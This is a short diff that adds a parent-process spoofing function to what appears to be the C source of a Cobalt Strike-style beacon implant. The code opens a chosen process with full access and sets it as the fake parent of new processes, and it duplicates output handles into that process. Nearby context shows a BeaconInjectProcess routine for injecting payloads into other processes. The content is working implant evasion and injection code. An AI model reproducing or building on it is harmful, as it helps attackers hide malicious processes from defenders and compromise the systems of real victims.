@@ -806,6 +806,50 @@ typedef struct _RUN_UNDER_CONTEXT {
 	BOOL(WINAPI* updateProcessAttributes)(struct _RUN_UNDER_CONTEXT*, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, STARTUPINFO*);
 	VOID(WINAPI* cleanup)(const struct _RUN_UNDER_CONTEXT*);
 } RUN_UNDER_CONTEXT, * PRUN_UNDER_CONTEXT;
+BOOL UpdateParentProcessContext(PRUN_UNDER_CONTEXT context, DWORD parentPid, LPPROC_THREAD_ATTRIBUTE_LIST attributeList, STARTUPINFO* si)
+{
+	// Open the parent process with full access
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPid);
+	if (hProcess == NULL)
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not set PID to %d: %s", parentPid, LAST_ERROR_STR(lastError));
+		BeaconErrorDD(ERROR_SET_PID_FAILED, parentPid, lastError);
+		return FALSE;
+	}
+
+	// Store the handle to the parent process
+	context->handle = hProcess;
+
+	// Update the process attribute list
+	if (!UpdateProcThreadAttribute(attributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not update process attribute: %s", LAST_ERROR_STR(lastError));
+		BeaconErrorD(ERROR_UPDATE_PROC_THREAD_ATTRIBUTE_LIST_FAILED, lastError);
+		return FALSE;
+	}
+
+	if (si->hStdOutput && si->hStdError && si->hStdOutput == si->hStdError)
+	{
+		DuplicateHandle(GetCurrentProcess(), si->hStdOutput, hProcess, &si->hStdOutput, 0, TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);
+		si->hStdError = si->hStdOutput;
+	}
+	else
+	{
+		if (si->hStdOutput)
+		{
+			DuplicateHandle(GetCurrentProcess(), si->hStdOutput, hProcess, &si->hStdOutput, 0, TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);
+		}
+
+		if (si->hStdError)
+		{
+			DuplicateHandle(GetCurrentProcess(), si->hStdError, hProcess, &si->hStdError, 0, TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);
+		}
+	}
+
+	return TRUE;
+}
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
